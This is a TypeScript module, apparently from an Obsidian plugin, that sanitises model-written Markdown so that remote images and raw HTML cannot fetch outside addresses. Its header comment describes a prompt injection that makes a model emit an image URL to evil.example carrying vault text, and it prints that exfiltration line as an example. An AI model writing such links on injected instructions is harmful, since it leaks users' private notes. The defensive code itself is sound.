/* WHAT THE MODEL WRITES IS UNTRUSTED INPUT (plugin review, 2026-11-21).
 *
 * A prompt injection hidden in a note, a web page or a tool result can make
 * the model write `![](https://evil.example/?d=<vault text>)`. Rendered as
 * Markdown, that image is requested the moment the reply appears: no click,
 * no approval, the vault text in the URL. Stripping the <img> after rendering
 * is too late, because the browser starts the request as soon as the element
 * exists. So the text is neutralised BEFORE it reaches the renderer:
 *
 *   - a Markdown image whose address is remote becomes a plain link
 *     (`[image: alt](url)`): visible, and fetched only if the member clicks;
 *   - a reference-style image (`![alt][ref]`) loses its `!` the same way;
 *   - raw HTML tags are shown as text, except a short list of harmless
 *     formatting tags written without attributes (<br>, <kbd>, <sub>, ...).
 *
 * Code spans and fenced blocks are left exactly as they are: inside them the
 * renderer already shows HTML as text, and changing them would corrupt code.
 * Local images (vault paths, app:, data:, blob:) and Obsidian's own embeds
 * (`![[...]]`) are kept. `stripRemoteMedia` is the second wall, run on the
 * rendered element for anything another plugin's post-processor adds.
 *
 * No Obsidian import, on purpose: pure, so node:test measures it.
 */

const LOCAL_SCHEME = /^(app|data|blob|capacitor):/i;
const REMOTE_ADDRESS = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i;

/** True when an image address would be fetched from outside the vault. */
export function isRemoteAddress(address: string): boolean {
  const a = address.trim().replace(/^<|>$/g, '');
  if (!a) return false;
  if (LOCAL_SCHEME.test(a)) return false;
  return REMOTE_ADDRESS.test(a);
}

const SAFE_TAGS = new Set(['br', 'kbd', 'sub', 'sup', 'b', 'i', 'em', 'strong', 'u', 's', 'mark', 'small', 'code', 'details', 'summary', 'hr']);

/* <tag ...>, </tag>, <tag/> and <!-- comments --> */
const HTML_TAG = /<!--[\s\S]*?-->|<\/?([a-zA-Z][a-zA-Z0-9-]*)(\s[^<>]*)?\/?>/g;
/* ![alt](address "title") with one level of nested brackets in alt */
const MD_IMAGE = /!\[((?:[^[\]]|\[[^[\]]*\])*)\]\(\s*(<[^>]*>|[^\s)]+)((?:\s+(?:"[^"]*"|'[^']*'|\([^)]*\)))?)\s*\)/g;
/* ![alt][ref] and ![alt][] (reference images); not ![[embed]] */
const MD_REF_IMAGE = /!\[((?:[^[\]]|\[[^[\]]*\])*)\]\[([^\]]*)\]/g;

function neutraliseProse(text: string): string {
  let out = text.replace(MD_IMAGE, (whole, alt: string, address: string, title: string) => {
    if (!isRemoteAddress(address)) return whole;
    const label = alt.trim() ? `image: ${alt.trim()}` : 'image';
    return `[${label}](${address}${title})`;
  });
  out = out.replace(MD_REF_IMAGE, (_whole, alt: string, ref: string) => `[${alt.trim() ? `image: ${alt.trim()}` : 'image'}][${ref}]`);
  out = out.replace(HTML_TAG, (tag: string, name?: string, attrs?: string) => {
    if (name && SAFE_TAGS.has(name.toLowerCase()) && !(attrs && attrs.trim())) return tag;
    return tag.replace(/</g, '&lt;').replace(/>/g, '&gt;');
  });
  return out;
}

/* Inline code spans on one line: a run of N backticks closes on the next run
 * of exactly N. Text between spans is prose. */
function neutraliseLine(line: string): string {
  let out = '';
  let i = 0;
  while (i < line.length) {
    const tick = line.indexOf('`', i);
    if (tick < 0) { out += neutraliseProse(line.slice(i)); break; }
    out += neutraliseProse(line.slice(i, tick));
    let run = 0;
    while (line[tick + run] === '`') run++;
    const fence = '`'.repeat(run);
    let close = -1;
    for (let j = tick + run; j <= line.length - run; j++) {
      if (line.startsWith(fence, j) && line[j + run] !== '`' && line[j - 1] !== '`') { close = j; break; }
    }
    if (close < 0) { out += line.slice(tick, tick + run); i = tick + run; continue; }
    out += line.slice(tick, close + run);
    i = close + run;
  }
  return out;
}

/** Make a model reply safe to hand to the Markdown renderer. */
export function neutraliseUntrustedMarkdown(markdown: string): string {
  const lines = markdown.split('\n');
  let fence: string | null = null;
  for (let k = 0; k < lines.length; k++) {
    const line = lines[k] ?? '';
    const open = /^\s{0,3}(`{3,}|~{3,})/.exec(line);
    const marker = open ? (open[1] ?? '') : '';
    if (fence !== null) {
      if (marker && marker[0] === fence[0] && marker.length >= fence.length && line.trim() === marker) fence = null;
      continue;
    }
    if (marker) { fence = marker; continue; }
    if (/^( {4}|\t)/.test(line)) continue; // indented code block
    lines[k] = neutraliseLine(line);
  }
  return lines.join('\n');
}

const MEDIA = 'img, iframe, video, audio, source, embed, object, picture, link, image';

/** Second wall: remove remote media left in a rendered element. Returns how many. */
export function stripRemoteMedia(root: { querySelectorAll(sel: string): ArrayLike<{ getAttribute(n: string): string | null; remove(): void }> }): number {
  let removed = 0;
  const found = root.querySelectorAll(MEDIA);
  for (let k = 0; k < found.length; k++) {
    const el = found[k];
    if (!el) continue;
    const addresses = ['src', 'href', 'xlink:href', 'data', 'poster']
      .map((n) => el.getAttribute(n))
      .filter((v): v is string => !!v);
    const srcset = el.getAttribute('srcset');
    if (srcset) addresses.push(...srcset.split(',').map((p) => p.trim().split(/\s+/)[0] ?? ''));
    if (addresses.some(isRemoteAddress)) { el.remove(); removed++; }
  }
  return removed;
}
